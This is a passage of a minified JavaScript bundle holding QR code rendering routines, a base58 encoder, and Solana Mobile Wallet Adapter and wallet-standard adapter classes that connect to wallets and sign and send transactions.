i=Pp.getSymbolTotalCodewords(n),s=W0.getTotalCodewordsCount(n,e),o=(i-s)*8;for(r.getLengthInBits()+4<=o&&r.put(0,4);r.getLengthInBits()%8!==0;)r.putBit(0);const a=(o-r.getLengthInBits())/8;for(let l=0;l<a;l++)r.put(l%2?17:236,8);return KB(r,n,e)}function KB(n,e,t){const r=Pp.getSymbolTotalCodewords(e),i=W0.getTotalCodewordsCount(e,t),s=r-i,o=W0.getBlocksCount(e,t),a=r%o,l=o-a,u=Math.floor(r/o),h=Math.floor(s/o),f=h+1,m=u-h,v=new UB(m);let x=0;const k=new Array(o),I=new Array(o);let S=0;const b=new Uint8Array(n.buffer);for(let L=0;L<o;L++){const N=L<l?h:f;k[L]=b.slice(x,x+N),I[L]=v.encode(k[L]),x+=N,S=Math.max(S,N)}const E=new Uint8Array(r);let U=0,H,q;for(H=0;H<S;H++)for(q=0;q<o;q++)H<k[q].length&&(E[U++]=k[q][H]);for(H=0;H<m;H++)for(q=0;q<o;q++)E[U++]=I[q][H];return E}function GB(n,e,t,r){let i;if(Array.isArray(n))i=fm.fromArray(n);else if(typeof n=="string"){let u=e;if(!u){const h=fm.rawSplit(n);u=Sd.getBestVersionForData(h,t)}i=fm.fromString(n,u||40)}else throw new Error("Invalid data");const s=Sd.getBestVersionForData(i,t);if(!s)throw new Error("The amount of data is too big to be stored in a QR Code");if(!e)e=s;else if(e<s)throw new Error(`
The chosen QR Code version cannot contain this amount of data.
Minimum version required to store current data is: `+s+`.
`);const o=qB(e,t,i),a=Pp.getSymbolSize(e),l=new DB(a);return FB(l,e),zB(l),WB(l,e),dm(l,t,0),e>=7&&$B(l,e),HB(l,o),isNaN(r)&&(r=z0.getBestMask(l,dm.bind(null,l,t))),z0.applyMask(r,l),dm(l,t,r),{modules:l,version:e,errorCorrectionLevel:t,maskPattern:r,segments:i}}Sx.create=function(e,t){if(typeof e>"u"||e==="")throw new Error("No input text");let r=hm.M,i,s;return typeof t<"u"&&(r=hm.from(t.errorCorrectionLevel,hm.M),i=Sd.from(t.version),s=z0.from(t.maskPattern),t.toSJISFunc&&Pp.setToSJISFunction(t.toSJISFunc)),GB(e,i,r,s)};var Ox={},av={};(function(n){function e(t){if(typeof t=="number"&&(t=t.toString()),typeof t!="string")throw new Error("Color should be defined as hex string");let r=t.slice().replace("#","").split("");if(r.length<3||r.length===5||r.length>8)throw new Error("Invalid hex color: "+t);(r.length===3||r.length===4)&&(r=Array.prototype.concat.apply([],r.map(function(s){return[s,s]}))),r.length===6&&r.push("F","F");const i=parseInt(r.join(""),16);return{r:i>>24&255,g:i>>16&255,b:i>>8&255,a:i&255,hex:"#"+r.slice(0,6).join("")}}n.getOptions=function(r){r||(r={}),r.color||(r.color={});const i=typeof r.margin>"u"||r.margin===null||r.margin<0?4:r.margin,s=r.width&&r.width>=21?r.width:void 0,o=r.scale||4;return{width:s,scale:s?4:o,margin:i,color:{dark:e(r.color.dark||"#000000ff"),light:e(r.color.light||"#ffffffff")},type:r.type,rendererOpts:r.rendererOpts||{}}},n.getScale=function(r,i){return i.width&&i.width>=r+i.margin*2?i.width/(r+i.margin*2):i.scale},n.getImageWidth=function(r,i){const s=n.getScale(r,i);return Math.floor((r+i.margin*2)*s)},n.qrToImageData=function(r,i,s){const o=i.modules.size,a=i.modules.data,l=n.getScale(o,s),u=Math.floor((o+s.margin*2)*l),h=s.margin*l,f=[s.color.light,s.color.dark];for(let m=0;m<u;m++)for(let v=0;v<u;v++){let x=(m*u+v)*4,k=s.color.light;if(m>=h&&v>=h&&m<u-h&&v<u-h){const I=Math.floor((m-h)/l),S=Math.floor((v-h)/l);k=f[a[I*o+S]?1:0]}r[x++]=k.r,r[x++]=k.g,r[x++]=k.b,r[x]=k.a}}})(av);(function(n){const e=av;function t(i,s,o){i.clearRect(0,0,s.width,s.height),s.style||(s.style={}),s.height=o,s.width=o,s.style.height=o+"px",s.style.width=o+"px"}function r(){try{return document.createElement("canvas")}catch{throw new Error("You need to specify a canvas element")}}n.render=function(s,o,a){let l=a,u=o;typeof l>"u"&&(!o||!o.getContext)&&(l=o,o=void 0),o||(u=r()),l=e.getOptions(l);const h=e.getImageWidth(s.modules.size,l),f=u.getContext("2d"),m=f.createImageData(h,h);return e.qrToImageData(m.data,s,l),t(f,u,h),f.putImageData(m,0,0),u},n.renderToDataURL=function(s,o,a){let l=a;typeof l>"u"&&(!o||!o.getContext)&&(l=o,o=void 0),l||(l={});const u=n.render(s,o,l),h=l.type||"image/png",f=l.rendererOpts||{};return u.toDataURL(h,f.quality)}})(Ox);var Bx={};const QB=av;function LE(n,e){const t=n.a/255,r=e+'="'+n.hex+'"';return t<1?r+" "+e+'-opacity="'+t.toFixed(2).slice(1)+'"':r}function pm(n,e,t){let r=n+e;return typeof t<"u"&&(r+=" "+t),r}function YB(n,e,t){let r="",i=0,s=!1,o=0;for(let a=0;a<n.length;a++){const l=Math.floor(a%e),u=Math.floor(a/e);!l&&!s&&(s=!0),n[a]?(o++,a>0&&l>0&&n[a-1]||(r+=s?pm("M",l+t,.5+u+t):pm("m",i,0),i=0,s=!1),l+1<e&&n[a+1]||(r+=pm("h",o),o=0)):i++}return r}Bx.render=function(e,t,r){const i=QB.getOptions(t),s=e.modules.size,o=e.modules.data,a=s+i.margin*2,l=i.color.light.a?"<path "+LE(i.color.light,"fill")+' d="M0 0h'+a+"v"+a+'H0z"/>':"",u="<path "+LE(i.color.dark,"stroke")+' d="'+YB(o,s,i.margin)+'"/>',h='viewBox="0 0 '+a+" "+a+'"',m='<svg xmlns="http://www.w3.org/2000/svg" '+(i.width?'width="'+i.width+'" height="'+i.width+'" ':"")+h+' shape-rendering="crispEdges">'+l+u+`</svg>
`;return typeof r=="function"&&r(null,m),m};const ZB=fB,$0=Sx,Ux=Ox,JB=Bx;function lv(n,e,t,r,i){const s=[].slice.call(arguments,1),o=s.length,a=typeof s[o-1]=="function";if(!a&&!ZB())throw new Error("Callback required as last argument");if(a){if(o<2)throw new Error("Too few arguments provided");o===2?(i=t,t=e,e=r=void 0):o===3&&(e.getContext&&typeof i>"u"?(i=r,r=void 0):(i=r,r=t,t=e,e=void 0))}else{if(o<1)throw new Error("Too few arguments provided");return o===1?(t=e,e=r=void 0):o===2&&!e.getContext&&(r=t,t=e,e=void 0),new Promise(function(l,u){try{const h=$0.create(t,r);l(n(h,e,r))}catch(h){u(h)}})}try{const l=$0.create(t,r);i(null,n(l,e,r))}catch(l){i(l)}}$0.create;lv.bind(null,Ux.render);lv.bind(null,Ux.renderToDataURL);lv.bind(null,function(n,e,t){return JB.render(n,t)});function tt(n,e,t,r){function i(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(h){try{u(r.next(h))}catch(f){o(f)}}function l(h){try{u(r.throw(h))}catch(f){o(f)}}function u(h){h.done?s(h.value):i(h.value).then(a,l)}u((r=r.apply(n,e||[])).next())})}function Af(n){return new Uint8Array(window.atob(n).split("").map(e=>e.charCodeAt(0)))}function XB(){return typeof window<"u"&&window.isSecureContext&&typeof document<"u"&&/android/i.test(navigator.userAgent)}const nu="Mobile Wallet Adapter",e6=64;function t6(n){const e=Af(n);return new Ie(e)}function DE(n){return"version"in n}function n6(n){switch(n){case"mainnet-beta":return"solana:mainnet";case"testnet":return"solana:testnet";case"devnet":return"solana:devnet"}}class r6 extends v3{constructor(e){var t;super(),this.supportedTransactionVersions=new Set(["legacy",0]),this.name=nu,this.url="https://solanamobile.com/wallets",this.icon="data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjI4IiB3aWR0aD0iMjgiIHZpZXdCb3g9Ii0zIDAgMjggMjgiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0iI0RDQjhGRiI+PHBhdGggZD0iTTE3LjQgMTcuNEgxNXYyLjRoMi40di0yLjRabTEuMi05LjZoLTIuNHYyLjRoMi40VjcuOFoiLz48cGF0aCBkPSJNMjEuNiAzVjBoLTIuNHYzaC0zLjZWMGgtMi40djNoLTIuNHY2LjZINC41YTIuMSAyLjEgMCAxIDEgMC00LjJoMi43VjNINC41QTQuNSA0LjUgMCAwIDAgMCA3LjVWMjRoMjEuNnYtNi42aC0yLjR2NC4ySDIuNFYxMS41Yy41LjMgMS4yLjQgMS44LjVoNy41QTYuNiA2LjYgMCAwIDAgMjQgOVYzaC0yLjRabTAgNS43YTQuMiA0LjIgMCAxIDEtOC40IDBWNS40aDguNHYzLjNaIi8+PC9nPjwvc3ZnPg==",this._connecting=!1,this._connectionGeneration=0,this._readyState=XB()?Ve.Loadable:Ve.Unsupported,this._authorizationResultCache=e.authorizationResultCache,this._addressSelector=e.addressSelector,this._appIdentity=e.appIdentity,this._chain=(t=e.chain)!==null&&t!==void 0?t:n6(e.cluster),this._hostAuthority=e.remoteHostAuthority,this._onWalletNotFound=e.onWalletNotFound,this._readyState!==Ve.Unsupported&&this._authorizationResultCache.get().then(r=>{r&&this.declareWalletAsInstalled()})}get publicKey(){if(this._publicKey==null&&this._selectedAddress!=null)try{this._publicKey=t6(this._selectedAddress)}catch(e){throw new Rl(e instanceof Error&&(e==null?void 0:e.message)||"Unknown error",e)}return this._publicKey?this._publicKey:null}get connected(){return!!this._authorizationResult}get connecting(){return this._connecting}get readyState(){return this._readyState}declareWalletAsInstalled(){this._readyState!==Ve.Installed&&this.emit("readyStateChange",this._readyState=Ve.Installed)}runWithGuard(e){return tt(this,void 0,void 0,function*(){try{return yield e()}catch(t){throw this.emit("error",t),t}})}autoConnect_DO_NOT_USE_OR_YOU_WILL_BE_FIRED(){return tt(this,void 0,void 0,function*(){return yield this.autoConnect()})}autoConnect(){return tt(this,void 0,void 0,function*(){if(!(this.connecting||this.connected))return yield this.runWithGuard(()=>tt(this,void 0,void 0,function*(){if(this._readyState!==Ve.Installed&&this._readyState!==Ve.Loadable)throw new Xs;this._connecting=!0;try{const e=yield this._authorizationResultCache.get();e&&this.handleAuthorizationResult(e)}catch(e){throw new Vs(e instanceof Error&&e.message||"Unknown error",e)}finally{this._connecting=!1}}))})}connect(){return tt(this,void 0,void 0,function*(){if(!(this.connecting||this.connected))return yield this.runWithGuard(()=>tt(this,void 0,void 0,function*(){if(this._readyState!==Ve.Installed&&this._readyState!==Ve.Loadable)throw new Xs;this._connecting=!0;try{yield this.performAuthorization()}catch(e){throw new Vs(e instanceof Error&&e.message||"Unknown error",e)}finally{this._connecting=!1}}))})}performAuthorization(e){return tt(this,void 0,void 0,function*(){try{const t=yield this._authorizationResultCache.get();return t?(this.handleAuthorizationResult(t),t):yield this.transact(r=>tt(this,void 0,void 0,function*(){const i=yield r.authorize({chain:this._chain,identity:this._appIdentity,sign_in_payload:e});return Promise.all([this._authorizationResultCache.set(i),this.handleAuthorizationResult(i)]),i}))}catch(t){throw new Vs(t instanceof Error&&t.message||"Unknown error",t)}})}handleAuthorizationResult(e){var t;return tt(this,void 0,void 0,function*(){const r=this._authorizationResult==null||((t=this._authorizationResult)===null||t===void 0?void 0:t.accounts.length)!==e.accounts.length||this._authorizationResult.accounts.some((i,s)=>i.address!==e.accounts[s].address);if(this._authorizationResult=e,this.declareWalletAsInstalled(),r){const i=yield this._addressSelector.select(e.accounts.map(({address:s})=>s));i!==this._selectedAddress&&(this._selectedAddress=i,delete this._publicKey,this.emit("connect",this.publicKey))}})}performReauthorization(e,t){return tt(this,void 0,void 0,function*(){try{const r=yield e.authorize({auth_token:t,identity:this._appIdentity});Promise.all([this._authorizationResultCache.set(r),this.handleAuthorizationResult(r)])}catch(r){throw this.disconnect(),new xp(r instanceof Error&&(r==null?void 0:r.message)||"Unknown error",r)}})}disconnect(){return tt(this,void 0,void 0,function*(){this._authorizationResultCache.clear(),this._connecting=!1,this._connectionGeneration++,delete this._authorizationResult,delete this._publicKey,delete this._selectedAddress,this.emit("disconnect")})}transact(e){var t;return tt(this,void 0,void 0,function*(){const r=(t=this._authorizationResult)===null||t===void 0?void 0:t.wallet_uri_base,i=r?{baseUri:r}:void 0,s=this._hostAuthority?{remoteHostAuthority:this._hostAuthority}:void 0,o=this._connectionGeneration;try{return yield hB(e,Object.assign(Object.assign({},i),s))}catch(a){throw this._connectionGeneration!==o&&(yield new Promise(()=>{})),a instanceof Error&&a.name==="SolanaMobileWalletAdapterError"&&a.code==="ERROR_WALLET_NOT_FOUND"&&(yield this._onWalletNotFound(this)),a}})}assertIsAuthorized(){if(!this._authorizationResult||!this._selectedAddress)throw new sn;return{authToken:this._authorizationResult.auth_token,selectedAddress:this._selectedAddress}}performSignTransactions(e){return tt(this,void 0,void 0,function*(){const{authToken:t}=this.assertIsAuthorized();try{return yield this.transact(r=>tt(this,void 0,void 0,function*(){return yield this.performReauthorization(r,t),yield r.signTransactions({transactions:e})}))}catch(r){throw new si(r==null?void 0:r.message,r)}})}sendTransaction(e,t,r){return tt(this,void 0,void 0,function*(){return yield this.runWithGuard(()=>tt(this,void 0,void 0,function*(){const{authToken:i}=this.assertIsAuthorized(),s=r==null?void 0:r.minContextSlot;try{return yield this.transact(o=>tt(this,void 0,void 0,function*(){function a(){let f;switch(t.commitment){case"confirmed":case"finalized":case"processed":f=t.commitment;break;default:f="finalized"}let m;switch(r==null?void 0:r.preflightCommitment){case"confirmed":case"finalized":case"processed":m=r.preflightCommitment;break;case void 0:m=f;break;default:m="finalized"}return(m==="finalized"?2:m==="confirmed"?1:0)<(f==="finalized"?2:f==="confirmed"?1:0)?m:f}const[l,u,h]=yield Promise.all([o.getCapabilities(),this.performReauthorization(o,i),DE(e)?null:(()=>tt(this,void 0,void 0,function*(){var f;if(e.feePayer||(e.feePayer=(f=this.publicKey)!==null&&f!==void 0?f:void 0),e.recentBlockhash==null){const{blockhash:m}=yield t.getLatestBlockhash({commitment:a()});e.recentBlockhash=m}}))()]);if(l.supports_sign_and_send_transactions)return(yield o.signAndSendTransactions({minContextSlot:s,transactions:[e]}))[0];{const[f]=yield o.signTransactions({transactions:[e]});if(DE(f))return yield t.sendTransaction(f);{const m=f.serialize();return yield t.sendRawTransaction(m,Object.assign(Object.assign({},r),{preflightCommitment:a()}))}}}))}catch(o){throw new Yi(o==null?void 0:o.message,o)}}))})}signTransaction(e){return tt(this,void 0,void 0,function*(){return yield this.runWithGuard(()=>tt(this,void 0,void 0,function*(){const[t]=yield this.performSignTransactions([e]);return t}))})}signAllTransactions(e){return tt(this,void 0,void 0,function*(){return yield this.runWithGuard(()=>tt(this,void 0,void 0,function*(){return yield this.performSignTransactions(e)}))})}signMessage(e){return tt(this,void 0,void 0,function*(){return yield this.runWithGuard(()=>tt(this,void 0,void 0,function*(){const{authToken:t,selectedAddress:r}=this.assertIsAuthorized();try{return yield this.transact(i=>tt(this,void 0,void 0,function*(){yield this.performReauthorization(i,t);const[s]=yield i.signMessages({addresses:[r],payloads:[e]});return s.slice(-e6)}))}catch(i){throw new kp(i==null?void 0:i.message,i)}}))})}signIn(e){return tt(this,void 0,void 0,function*(){return yield this.runWithGuard(()=>tt(this,void 0,void 0,function*(){var t,r;if(this._readyState!==Ve.Installed&&this._readyState!==Ve.Loadable)throw new Xs;this._connecting=!0;try{const i=yield this.performAuthorization(Object.assign(Object.assign({},e),{domain:(t=e==null?void 0:e.domain)!==null&&t!==void 0?t:window.location.host}));if(!i.sign_in_result)throw new Error("Sign in failed, no sign in result returned by wallet");const s=i.sign_in_result.address;return{account:Object.assign(Object.assign({},(r=i.accounts.find(a=>a.address==s))!==null&&r!==void 0?r:{address:s}),{publicKey:Af(s)}),signedMessage:Af(i.sign_in_result.signed_message),signature:Af(i.sign_in_result.signature)}}catch(i){throw new Vs(i instanceof Error&&i.message||"Unknown error",i)}finally{this._connecting=!1}}))})}}function i6(){return{select(n){return tt(this,void 0,void 0,function*(){return n[0]})}}}const gm="SolanaMobileWalletAdapterDefaultAuthorizationCache";function s6(){let n;try{n=window.localStorage}catch{}return{clear(){return tt(this,void 0,void 0,function*(){if(n)try{n.removeItem(gm)}catch{}})},get(){return tt(this,void 0,void 0,function*(){if(n)try{return JSON.parse(n.getItem(gm))||void 0}catch{}})},set(e){return tt(this,void 0,void 0,function*(){if(n)try{n.setItem(gm,JSON.stringify(e))}catch{}})}}}function o6(n){return tt(this,void 0,void 0,function*(){typeof window<"u"&&window.location.assign(n.url)})}function a6(){return o6}var l6=globalThis&&globalThis.__classPrivateFieldGet||function(n,e,t,r){if(t==="a"&&!r)throw new TypeError("Private accessor was defined without a getter");if(typeof e=="function"?n!==e||!r:!e.has(n))throw new TypeError("Cannot read private member from an object whose class did not declare it");return t==="m"?r:t==="a"?r.call(n):r?r.value:e.get(n)},c6=globalThis&&globalThis.__classPrivateFieldSet||function(n,e,t,r,i){if(r==="m")throw new TypeError("Private method is not writable");if(r==="a"&&!i)throw new TypeError("Private accessor was defined without a setter");if(typeof e=="function"?n!==e||!i:!e.has(n))throw new TypeError("Cannot write private member to an object whose class did not declare it");return r==="a"?i.call(n,t):i?i.value=t:e.set(n,t),t},bf;function u6(n){const e=({register:t})=>t(n);try{window.dispatchEvent(new h6(e))}catch(t){console.error(`wallet-standard:register-wallet event could not be dispatched
`,t)}try{window.addEventListener("wallet-standard:app-ready",({detail:t})=>e(t))}catch(t){console.error(`wallet-standard:app-ready event listener could not be added
`,t)}}class h6 extends Event{get detail(){return l6(this,bf,"f")}get type(){return"wallet-standard:register-wallet"}constructor(e){super("wallet-standard:register-wallet",{bubbles:!1,cancelable:!1,composed:!1}),bf.set(this,void 0),c6(this,bf,e,"f")}preventDefault(){throw new Error("preventDefault cannot be called")}stopImmediatePropagation(){throw new Error("stopImmediatePropagation cannot be called")}stopPropagation(){throw new Error("stopPropagation cannot be called")}}bf=new WeakMap;globalThis&&globalThis.__classPrivateFieldGet;globalThis&&globalThis.__classPrivateFieldSet;function f6(n,e){if(n===e)return!0;const t=n.length;if(t!==e.length)return!1;for(let r=0;r<t;r++)if(n[r]!==e[r])return!1;return!0}function d6(n){if(n.length>=255)throw new TypeError("Alphabet too long");const e=new Uint8Array(256);for(let u=0;u<e.length;u++)e[u]=255;for(let u=0;u<n.length;u++){const h=n.charAt(u),f=h.charCodeAt(0);if(e[f]!==255)throw new TypeError(h+" is ambiguous");e[f]=u}const t=n.length,r=n.charAt(0),i=Math.log(t)/Math.log(256),s=Math.log(256)/Math.log(t);function o(u){if(u instanceof Uint8Array||(ArrayBuffer.isView(u)?u=new Uint8Array(u.buffer,u.byteOffset,u.byteLength):Array.isArray(u)&&(u=Uint8Array.from(u))),!(u instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(u.length===0)return"";let h=0,f=0,m=0;const v=u.length;for(;m!==v&&u[m]===0;)m++,h++;const x=(v-m)*s+1>>>0,k=new Uint8Array(x);for(;m!==v;){let b=u[m],E=0;for(let U=x-1;(b!==0||E<f)&&U!==-1;U--,E++)b+=256*k[U]>>>0,k[U]=b%t>>>0,b=b/t>>>0;if(b!==0)throw new Error("Non-zero carry");f=E,m++}let I=x-f;for(;I!==x&&k[I]===0;)I++;let S=r.repeat(h);for(;I<x;++I)S+=n.charAt(k[I]);return S}function a(u){if(typeof u!="string")throw new TypeError("Expected String");if(u.length===0)return new Uint8Array;let h=0,f=0,m=0;for(;u[h]===r;)f++,h++;const v=(u.length-h)*i+1>>>0,x=new Uint8Array(v);for(;h<u.length;){const b=u.charCodeAt(h);if(b>255)return;let E=e[b];if(E===255)return;let U=0;for(let H=v-1;(E!==0||U<m)&&H!==-1;H--,U++)E+=t*x[H]>>>0,x[H]=E%256>>>0,E=E/256>>>0;if(E!==0)throw new Error("Non-zero carry");m=U,h++}let k=v-m;for(;k!==v&&x[k]===0;)k++;const I=new Uint8Array(f+(v-k));let S=f;for(;k!==v;)I[S++]=x[k++];return I}function l(u){const h=a(u);if(h)return h;throw new Error("Non-base"+t+" character")}return{encode:o,decodeUnsafe:a,decode:l}}var p6="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";const jx=d6(p6);var _e=globalThis&&globalThis.__classPrivateFieldGet||function(n,e,t,r){if(t==="a"&&!r)throw new TypeError("Private accessor was defined without a getter");if(typeof e=="function"?n!==e||!r:!e.has(n))throw new TypeError("Cannot read private member from an object whose class did not declare it");return t==="m"?r:t==="a"?r.call(n):r?r.value:e.get(n)},ln=globalThis&&globalThis.__classPrivateFieldSet||function(n,e,t,r,i){if(r==="m")throw new TypeError("Private method is not writable");if(r==="a"&&!i)throw new TypeError("Private accessor was defined without a setter");if(typeof e=="function"?n!==e||!i:!e.has(n))throw new TypeError("Cannot write private member to an object whose class did not declare it");return r==="a"?i.call(n,t):i?i.value=t:e.set(n,t),t},Pn,hr,zo,Wo,No,jc,Td,nt,Ad,H0,xf,q0,ru,K0,OE,BE,UE,jE;class g6 extends hx{get name(){return _e(this,nt,"f").name}get url(){return"https://github.com/solana-labs/wallet-standard"}get icon(){return _e(this,nt,"f").icon}get readyState(){return _e(this,Ad,"f")}get publicKey(){return _e(this,zo,"f")}get connecting(){return _e(this,Wo,"f")}get supportedTransactionVersions(){return _e(this,Td,"f")}get wallet(){return _e(this,nt,"f")}get standard(){return!0}constructor({wallet:e}){super(),Pn.add(this),hr.set(this,void 0),zo.set(this,void 0),Wo.set(this,void 0),No.set(this,void 0),jc.set(this,void 0),Td.set(this,void 0),nt.set(this,void 0),Ad.set(this,typeof window>"u"||typeof document>"u"?Ve.Unsupported:Ve.Installed),K0.set(this,t=>{if("accounts"in t){const r=_e(this,nt,"f").accounts[0];_e(this,hr,"f")&&!_e(this,No,"f")&&r!==_e(this,hr,"f")&&(r?_e(this,Pn,"m",xf).call(this,r):(this.emit("error",new xp),_e(this,Pn,"m",q0).call(this)))}"features"in t&&_e(this,Pn,"m",ru).call(this)}),ln(this,nt,e,"f"),ln(this,hr,null,"f"),ln(this,zo,null,"f"),ln(this,Wo,!1,"f"),ln(this,No,!1,"f"),ln(this,jc,_e(this,nt,"f").features[rv].on("change",_e(this,K0,"f")),"f"),_e(this,Pn,"m",ru).call(this)}destroy(){ln(this,hr,null,"f"),ln(this,zo,null,"f"),ln(this,Wo,!1,"f"),ln(this,No,!1,"f");const e=_e(this,jc,"f");e&&(ln(this,jc,null,"f"),e())}async autoConnect(){return _e(this,Pn,"m",H0).call(this,{silent:!0})}async connect(){return _e(this,Pn,"m",H0).call(this)}async disconnect(){if(U0 in _e(this,nt,"f").features)try{ln(this,No,!0,"f"),await _e(this,nt,"f").features[U0].disconnect()}catch(e){this.emit("error",new ev(e==null?void 0:e.message,e))}finally{ln(this,No,!1,"f")}_e(this,Pn,"m",q0).call(this)}async sendTransaction(e,t,r={}){try{const i=_e(this,hr,"f");if(!i)throw new sn;let s;if(Ki in _e(this,nt,"f").features)if(i.features.includes(Ki))s=Ki;else if(En in _e(this,nt,"f").features&&i.features.includes(En))s=En;else throw new Vo;else if(En in _e(this,nt,"f").features){if(!i.features.includes(En))throw new Vo;s=En}else throw new rl;const o=A3(t.rpcEndpoint);if(!i.chains.includes(o))throw new Yi;try{const{signers:a,...l}=r;let u;if(Zi(e)?(a!=null&&a.length&&e.sign(a),u=e.serialize()):(e=await this.prepareTransaction(e,t,l),a!=null&&a.length&&e.partialSign(...a),u=new Uint8Array(e.serialize({requireAllSignatures:!1,verifySignatures:!1}))),s===Ki){const[h]=await _e(this,nt,"f").features[Ki].signAndSendTransaction({account:i,chain:o,transaction:u,options:{preflightCommitment:im(l.preflightCommitment||t.commitment),skipPreflight:l.skipPreflight,maxRetries:l.maxRetries,minContextSlot:l.minContextSlot}});return jx.encode(h.signature)}else{const[h]=await _e(this,nt,"f").features[En].signTransaction({account:i,chain:o,transaction:u,options:{preflightCommitment:im(l.preflightCommitment||t.commitment),minContextSlot:l.minContextSlot}});return await t.sendRawTransaction(h.signedTransaction,{...l,preflightCommitment:im(l.preflightCommitment||t.commitment)})}}catch(a){throw a instanceof xn?a:new Yi(a==null?void 0:a.message,a)}}catch(i){throw this.emit("error",i),i}}}hr=new WeakMap,zo=new WeakMap,Wo=new WeakMap,No=new WeakMap,jc=new WeakMap,Td=new WeakMap,nt=new WeakMap,Ad=new WeakMap,K0=new WeakMap,Pn=new WeakSet,H0=async function(e){try{if(this.connected||this.connecting)return;if(_e(this,Ad,"f")!==Ve.Installed)throw new Xs;if(ln(this,Wo,!0,"f"),!_e(this,nt,"f").accounts.length)try{await _e(this,nt,"f").features[nv].connect(e)}catch(r){throw new Vs(r==null?void 0:r.message,r)}const t=_e(this,nt,"f").accounts[0];if(!t)throw new Vo;_e(this,Pn,"m",xf).call(this,t)}catch(t){throw this.emit("error",t),t}finally{ln(this,Wo,!1,"f")}},xf=function(e){let t;try{t=new Ie(e.address)}catch(r){throw new Rl(r==null?void 0:r.message,r)}ln(this,hr,e,"f"),ln(this,zo,t,"f"),_e(this,Pn,"m",ru).call(this),this.emit("connect",t)},q0=function(){ln(this,hr,null,"f"),ln(this,zo,null,"f"),_e(this,Pn,"m",ru).call(this),this.emit("disconnect")},ru=function(){var t,r;const e=Ki in _e(this,nt,"f").features?_e(this,nt,"f").features[Ki].supportedTransactionVersions:_e(this,nt,"f").features[En].supportedTransactionVersions;ln(this,Td,f6(e,["legacy"])?null:new Set(e),"f"),En in _e(this,nt,"f").features&&((t=_e(this,hr,"f"))!=null&&t.features.includes(En))?(this.signTransaction=_e(this,Pn,"m",OE),this.signAllTransactions=_e(this,Pn,"m",BE)):(delete this.signTransaction,delete this.signAllTransactions),Ua in _e(this,nt,"f").features&&((r=_e(this,hr,"f"))!=null&&r.features.includes(Ua))?this.signMessage=_e(this,Pn,"m",UE):delete this.signMessage,rm in _e(this,nt,"f").features?this.signIn=_e(this,Pn,"m",jE):delete this.signIn},OE=async function(e){try{const t=_e(this,hr,"f");if(!t)throw new sn;if(!(En in _e(this,nt,"f").features))throw new rl;if(!t.features.includes(En))throw new Vo;try{const i=(await _e(this,nt,"f").features[En].signTransaction({account:t,transaction:Zi(e)?e.serialize():new Uint8Array(e.serialize({requireAllSignatures:!1,verifySignatures:!1}))}))[0].signedTransaction;return Zi(e)?Lu.deserialize(i):xr.from(i)}catch(r){throw r instanceof xn?r:new si(r==null?void 0:r.message,r)}}catch(t){throw this.emit("error",t),t}},BE=async function(e){try{const t=_e(this,hr,"f");if(!t)throw new sn;if(!(En in _e(this,nt,"f").features))throw new rl;if(!t.features.includes(En))throw new Vo;try{const r=await _e(this,nt,"f").features[En].signTransaction(...e.map(i=>({account:t,transaction:Zi(i)?i.serialize():new Uint8Array(i.serialize({requireAllSignatures:!1,verifySignatures:!1}))})));return e.map((i,s)=>{const o=r[s].signedTransaction;return Zi(i)?Lu.deserialize(o):xr.from(o)})}catch(r){throw new si(r==null?void 0:r.message,r)}}catch(t){throw this.emit("error",t),t}},UE=async function(e){try{const t=_e(this,hr,"f");if(!t)throw new sn;if(!(Ua in _e(this,nt,"f").features))throw new rl;if(!t.features.includes(Ua))throw new Vo;try{return(await _e(this,nt,"f").features[Ua].signMessage({account:t,message:e}))[0].signature}catch(r){throw new kp(r==null?void 0:r.message,r)}}catch(t){throw this.emit("error",t),t}},jE=async function(e={}){try{if(!(rm in _e(this,nt,"f").features))throw new rl;let t;try{[t]=await _e(this,nt,"f").features[rm].signIn(e)}catch(r){throw new AE(r==null?void 0:r.message,r)}if(!t)throw new AE;return _e(this,Pn,"m",xf).call(this,t.account),t}catch(t){throw this.emit("error",t),t}};const m6=_3;var y6=globalThis&&globalThis.__classPrivateFieldGet||function(n,e,t,r){if(t==="a"&&!r)throw new TypeError("Private accessor was defined without a getter");if(typeof e=="function"?n!==e||!r:!e.has(n))throw new TypeError("Cannot read private member from an object whose class did not declare it");return t==="m"?r:t==="a"?r.call(n):r?r.value:e.get(n)},w6=globalThis&&globalThis.__classPrivateFieldSet||function(n,e,t,r,i){if(r==="m")throw new TypeError("Private method is not writable");if(r==="a"&&!i)throw new TypeError("Private accessor was defined without a setter");if(typeof e=="function"?n!==e||!i:!e.has(n))throw new TypeError("Cannot write private member to an object whose class did not declare it");return r==="a"?i.call(n,t):i?i.value=t:e.set(n,t),t},kf;let Ir;const Lp=new Set;function v6(n){iu=void 0,Lp.add(n)}function _6(n){iu=void 0,Lp.delete(n)}const il={};function E6(){if(Ir||(Ir=Object.freeze({register:VE,get:I6,on:S6}),typeof window>"u"))return Ir;const n=Object.freeze({register:VE});try{window.addEventListener("wallet-standard:register-wallet",({detail:e})=>e(n))}catch(e){console.error(`wallet-standard:register-wallet event listener could not be added
`,e)}try{window.dispatchEvent(new T6(n))}catch(e){console.error(`wallet-standard:app-ready event could not be dispatched
`,e)}return Ir}function VE(...n){var e;return n=n.filter(t=>!Lp.has(t)),n.length?(n.forEach(t=>v6(t)),(e=il.register)==null||e.forEach(t=>G0(()=>t(...n))),function(){var r;n.forEach(i=>_6(i)),(r=il.unregister)==null||r.forEach(i=>G0(()=>i(...n)))}):()=>{}}let iu;function I6(){return iu||(iu=[...Lp]),iu}function S6(n,e){var t;return(t=il[n])!=null&&t.push(e)||(il[n]=[e]),function(){var i;il[n]=(i=il[n])==null?void 0:i.filter(s=>e!==s)}}function G0(n){try{n()}catch(e){console.error(e)}}class T6 extends Event{get detail(){return y6(this,kf,"f")}get type(){return"wallet-standard:app-ready"}constructor(e){super("wallet-standard:app-ready",{bubbles:!1,cancelable:!1,composed:!1}),kf.set(this,void 0),w6(this,kf,e,"f")}preventDefault(){throw new Error("preventDefault cannot be called")}stopImmediatePropagation(){throw new Error("stopImmediatePropagation cannot be called")}stopPropagation(){throw new Error("stopPropagation cannot be called")}}kf=new WeakMap;function A6(){if(Ir||(Ir=E6(),typeof window>"u"))return Ir;const 